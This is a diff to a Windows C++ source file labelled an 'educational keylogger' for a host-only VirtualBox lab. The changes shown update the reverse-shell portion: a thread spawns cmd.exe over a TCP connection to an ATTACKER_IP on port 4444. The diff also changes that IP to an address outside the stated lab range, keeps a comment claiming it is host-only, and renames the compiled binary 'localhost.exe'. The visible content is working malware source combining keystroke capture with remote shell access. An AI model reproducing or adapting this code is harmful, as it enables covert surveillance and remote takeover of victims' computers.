@@ -1,5 +1,5 @@
 // =============================================================================
-// keylogger_edu.cpp — Educational Keylogger (LAN / Host-Only Version)
+// keylogger_edu.cpp ver. 1.2 — Educational Keylogger (LAN / Host-Only Version)
 // =============================================================================
 //
 // Adapted from: https://github.com/HashHashBit/Keylogger4
@@ -13,14 +13,13 @@
 //   Victim  (keylogger):  VirtualBox VM    → 192.168.56.x
 //   Network:              VirtualBox Host-Only Adapter (no internet)
 //
-// COMPILE (from MSYS2 UCRT64 or MinGW terminal):
-//   g++ keylogger_edu.cpp -o keylogger_edu.exe -lws2_32 -static
+// COMPILE (from MSYS2 UCRT64 or MinGW terminal): very Important: You should use this flag to avoid any issues during the  execution
+//    g++ kelogger_new.cpp -o localhost.exe -static -static-libgcc -static-libstdc++ -lws2_32 
 //
 // =============================================================================
-
-#include <windows.h>
-#include <iostream>
 #include <winsock2.h>
+#include <iostream>
+#include <windows.h>
 #include <winuser.h>
 #include <fstream>
 #include <stdio.h>
@@ -34,7 +33,7 @@ using namespace std;
 // ---------------------------------------------------------------------------
 // CONFIGURATION — change these to match your lab
 // ---------------------------------------------------------------------------
-#define ATTACKER_IP   "192.168.56.1"   // Host PC on VirtualBox Host-Only network
+#define ATTACKER_IP   "172.20.205.57"   // Host PC on VirtualBox Host-Only network
 #define ATTACKER_PORT 4444             // Port that ncat listens on
 #define LOG_FILE      "Record.txt"     // Keystroke log output file
 
@@ -52,8 +51,8 @@ SOCKET Winsock;
 SOCKET Sock;
 struct sockaddr_in hax;
 char ip_addr[16];
-STARTUPINFO ini_processo;
-PROCESS_INFORMATION processo_info;
+STARTUPINFOA ini_processo{};
+PROCESS_INFORMATION processo_info{};
 
 // ---------------------------------------------------------------------------
 // ConnectThread — establishes and maintains the TCP connection to the
@@ -83,22 +82,28 @@ DWORD WINAPI ConnectThread(LPVOID arg)
 DWORD WINAPI ShellThread(LPVOID arg)
 {
     for (;;)
-    {
-        if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0,
+    {   
+            
+        char commandLine[] = "cmd.exe";
+
+
+        if (CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0,
                           NULL, NULL, &ini_processo, &processo_info) == true)
         {
             break;
         }
         else
         {
+            char commandLine[] = "cmd.exe";
             WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax),
                        NULL, NULL, NULL, NULL);
-            CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0,
+            CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0,
                           NULL, NULL, &ini_processo, &processo_info);
         }
     }
     return 0;
 }
+
 
 // ---------------------------------------------------------------------------
 // main — entry point
